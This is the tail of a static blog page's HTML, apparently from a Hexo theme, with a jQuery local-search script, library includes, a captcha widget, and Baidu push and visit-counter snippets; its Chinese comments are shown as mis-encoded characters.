            <input type="search" id="searchInput" name="s" placeholder="è¯·è¾“å…¥æœç´¢çš„å…³é”®å­—"
                   class="search-input">
        </div>
        <div id="searchResult"></div>
    </div>
</div>

<script type="text/javascript">
$(function () {
    var searchFunc = function (path, search_id, content_id) {
        'use strict';
        $.ajax({
            url: path,
            dataType: "xml",
            success: function (xmlResponse) {
                // get the contents from search data
                var datas = $("entry", xmlResponse).map(function () {
                    return {
                        title: $("title", this).text(),
                        content: $("content", this).text(),
                        url: $("url", this).text()
                    };
                }).get();
                var $input = document.getElementById(search_id);
                var $resultContent = document.getElementById(content_id);
                $input.addEventListener('input', function () {
                    var str = '<ul class=\"search-result-list\">';
                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
                    $resultContent.innerHTML = "";
                    if (this.value.trim().length <= 0) {
                        return;
                    }
                    // perform local searching
                    datas.forEach(function (data) {
                        var isMatch = true;
                        var data_title = data.title.trim().toLowerCase();
                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
                        var data_url = data.url;
                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
                        var index_title = -1;
                        var index_content = -1;
                        var first_occur = -1;
                        // only match artiles with not empty titles and contents
                        if (data_title !== '' && data_content !== '') {
                            keywords.forEach(function (keyword, i) {
                                index_title = data_title.indexOf(keyword);
                                index_content = data_content.indexOf(keyword);
                                if (index_title < 0 && index_content < 0) {
                                    isMatch = false;
                                } else {
                                    if (index_content < 0) {
                                        index_content = 0;
                                    }
                                    if (i === 0) {
                                        first_occur = index_content;
                                    }
                                }
                            });
                        }
                        // show search results
                        if (isMatch) {
                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
                            var content = data.content.trim().replace(/<[^>]+>/g, "");
                            if (first_occur >= 0) {
                                // cut out 100 characters
                                var start = first_occur - 20;
                                var end = first_occur + 80;
                                if (start < 0) {
                                    start = 0;
                                }
                                if (start === 0) {
                                    end = 100;
                                }
                                if (end > content.length) {
                                    end = content.length;
                                }
                                var match_content = content.substr(start, end);
                                // highlight all keywords
                                keywords.forEach(function (keyword) {
                                    var regS = new RegExp(keyword, "gi");
                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
                                });

                                str += "<p class=\"search-result\">" + match_content + "...</p>"
                            }
                            str += "</li>";
                        }
                    });
                    str += "</ul>";
                    $resultContent.innerHTML = str;
                });
            }
        });
    };

    searchFunc('/search.xml', 'searchInput', 'searchResult');
});
</script>

    <!-- å›åˆ°é¡¶éƒ¨æŒ‰é’® -->
<div id="backTop" class="top-scroll">
    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
        <i class="fas fa-arrow-up"></i>
    </a>
</div>


    <script src="/libs/materialize/materialize.min.js"></script>
    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
    <script src="/libs/aos/aos.js"></script>
    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
    <script src="/js/matery.js"></script>

    

    

    <!-- é›ªèŠ±ç‰¹æ•ˆ -->
    

    <!-- é¼ æ ‡æ˜Ÿæ˜Ÿç‰¹æ•ˆ -->
    

     
        <script src="https://ssl.captcha.qq.com/TCaptcha.js"></script>
        <script src="/libs/others/TencentCaptcha.js"></script>
        <button id="TencentCaptcha" data-appid="xxxxxxxxxx" data-cbfn="callback" type="button" hidden></button>
    

    <!-- Baidu Analytics -->

    <!-- Baidu Push -->

<script>
    (function () {
        var bp = document.createElement('script');
        var curProtocol = window.location.protocol.split(':')[0];
        if (curProtocol === 'https') {
            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
        } else {
            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
        }
        var s = document.getElementsByTagName("script")[0];
        s.parentNode.insertBefore(bp, s);
    })();
</script>

    
    
    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
    

    

    

    <!--è…¾è®¯å…”å°å·¢-->
    
    

    

    

    
    <script src="/libs/instantpage/instantpage.js" type="module"></script>
    

</body>

</html>
